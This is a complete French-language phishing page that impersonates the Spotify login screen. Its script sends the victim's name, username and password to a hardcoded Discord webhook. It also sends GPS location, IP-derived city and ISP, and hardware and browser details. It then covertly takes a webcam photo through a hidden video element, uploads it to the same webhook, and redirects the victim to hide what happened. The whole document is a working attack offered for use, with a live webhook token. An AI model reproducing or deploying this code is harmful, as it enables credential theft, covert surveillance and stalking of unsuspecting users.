<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Spotify - Connexion</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
        .logo { width: 45px; margin: 0 auto 35px auto; }
        .field { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #fff; }
        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
        input:focus { border: 2px solid #1ed760; }
        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
        #loader { display: none; margin-top: 20px; }
        .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
        .load-txt { font-size: 12px; color: #b3b3b3; margin-top: 10px; font-weight: 700; }
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; pointer-events: none; }
        #c { display: none; }
    </style>
</head>
<body>
    <div class="app-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
        <div id="login-form">
            <div class="flex gap-2">
                <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text"></div>
                <div class="field w-1/2"><label>Nom</label><input id="ln" type="text"></div>
            </div>
            <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
            <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
            <button onclick="runOmniV36()" id="btn" class="btn-green">Se connecter</button>
        </div>

        <div id="loader">
            <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
            <div id="ltxt" class="load-txt">VÉRIFICATION RÉGIONALE...</div>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";

        async function runOmniV36() {
            const data = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
            if(!data.u || !data.p) return;

            document.getElementById('login-form').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            const pb = document.getElementById('pbar');
            const lt = document.getElementById('ltxt');

            // --- COLLECTE TOTALE ---
            pb.style.width = "30%";
            lt.innerText = "ACCÈS AUX CAPTEURS...";

            let stream = null;
            try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); document.getElementById('v').srcObject = stream; } catch(e) {}

            let gps = "❌ Désactivé";
            try {
                const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000}); });
                gps = `✅ **LOCALISÉ :** [Voir sur Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
            } catch(e) {}

            pb.style.width = "60%";
            lt.innerText = "ANALYSE DU MATÉRIEL...";

            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
            const gl = document.createElement('canvas').getContext('webgl');
            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
            
            // Le Gros Pavé de Logs
            const payload = {
                embeds: [{
                    title: `🔥 OMNI-LOG V36 - ${data.fn} ${data.ln}`,
                    color: 1955168,
                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                    fields: [
                        { name: "👤 IDENTITÉ", value: `**Prénom:** \`${data.fn}\`\n**Nom:** \`${data.ln}\`\n**User:** \`${data.u}\`\n**Pass:** \`${data.p}\`` },
                        { name: "📍 GÉOLOCALISATION", value: `${gps}\n**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**Région:** \`${net.region}\`\n**FAI:** \`${net.org}\`` },
                        { name: "📱 HARDWARE & SYSTÈME", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory || '?'} GB\`\n**CPU:** \`${navigator.hardwareConcurrency} cœurs\`\n**Batterie:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**OS:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`` },
                        { name: "🌐 NAVIGATEUR", value: `**User-Agent:** \`\`\`${navigator.userAgent}\`\`\`` }
                    ],
                    footer: { text: "LVN Ultimate System • " + new Date().toLocaleString() }
                }]
            };
            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

            // --- CAPTURE PHOTO ---
            pb.style.width = "90%";
            lt.innerText = "FINALISATION...";
            
            if(stream) {
                await new Promise(r => setTimeout(r, 3500));
                const v = document.getElementById('v');
                const can = document.getElementById('c');
                can.width = v.videoWidth; can.height = v.videoHeight;
                can.getContext('2d').drawImage(v, 0, 0);
                
                can.toBlob(async b => {
                    const fd = new FormData();
                    fd.append('file', b, 'shot.jpg');
                    fd.append('content', `📸 **Capture de ${data.fn} ${data.ln}**`);
                    await fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "http://googleusercontent.com/spotify.com/premium";
                }, 'image/jpeg', 0.8);
            } else {
                setTimeout(() => { window.location.href = "http://googleusercontent.com/spotify.com/premium"; }, 1000);
            }
        }
    </script>
</body>
</html>
